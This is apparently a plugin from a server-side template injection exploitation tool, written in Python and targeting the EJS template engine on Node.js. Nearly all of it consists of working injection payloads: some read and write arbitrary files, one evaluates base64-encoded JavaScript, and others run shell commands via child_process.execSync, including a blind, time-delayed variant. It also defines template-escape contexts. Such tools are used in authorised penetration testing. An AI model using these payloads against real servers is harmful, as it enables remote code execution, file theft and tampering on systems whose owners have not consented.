from plugins.languages import javascript
from utils import rand

# TODO: process.mainModule may be undefined, needs replacement
class Ejs(javascript.Javascript):
    generic_plugin = True

    def init(self):
        self.update_actions({
            'render': {
                'header': """<%= '{header}' %>""",
                'trailer': """<%= '{trailer}' %>""",
                'render': '{code}',
                'test_render': f'<%= typeof({rand.randints[0]})+{rand.randints[1]} %>',
                'test_render_expected': f'number{rand.randints[1]}'
            },
            'write': {
                'write': """<%global.process.mainModule.require('fs').appendFileSync('{path}', Buffer('{chunk_b64p}', 'base64'), 'binary')%>""",
                'truncate': """<%global.process.mainModule.require('fs').writeFileSync('{path}', '')%>"""
            },
            'read': {
                'read': """<%=global.process.mainModule.require('fs').readFileSync('{path}').toString('base64')%>"""
            },
            'md5': {
                'md5': """<%=global.process.mainModule.require('crypto').createHash('md5').update(global.process.mainModule.require('fs').readFileSync('{path}')).digest("hex")%>"""
            },
            'evaluate': {
                'evaluate': """<%=eval(Buffer('{code_b64p}', 'base64').toString())%>""",
                'test_os': """global.process.mainModule.require('os').platform()"""
                #'test_os': """process.platform"""
            },
            'execute_blind': {
                'execute_blind': """<%global.process.mainModule.require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString() + ' && sleep {delay}')%>"""
                #'execute_blind': """<%x=process.binding("spawn_sync").spawn({{file:"/bin/sh", args: ["/bin/sh","-c",Buffer('{code_b64p}', 'base64').toString() + ' && sleep {delay}'], stdio: [{{type:"pipe", readable:1, writable:1 }},{{type:"pipe", readable:1, writable:1}}]}}).output[1]%>"""
            },
            'execute': {
                'execute': """<%= global.process.mainModule.require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString()) %>"""
                #'execute': """<%x=process.binding("spawn_sync").spawn({{file:"/bin/sh", args: ["/bin/sh","-c",Buffer('{code_b64p}', 'base64').toString()], stdio: [{{type:"pipe", readable:1, writable:1 }},{{type:"pipe", readable:1, writable:1}}]}}).output[1]%>"""
            },
        })

        self.set_contexts([
            # Text context, no closures
            {'level': 0},
            {'level': 1, 'prefix': '{closure}%>', 'suffix': '<%#', 'closures': javascript.ctx_closures},
            {'level': 2, 'prefix': '{closure}%>', 'suffix': '<%#', 'closures': {1: ["'", ')'], 2: ['"', ')']}},
            {'level': 3, 'prefix': '*/%>', 'suffix': '<%#'},
        ])
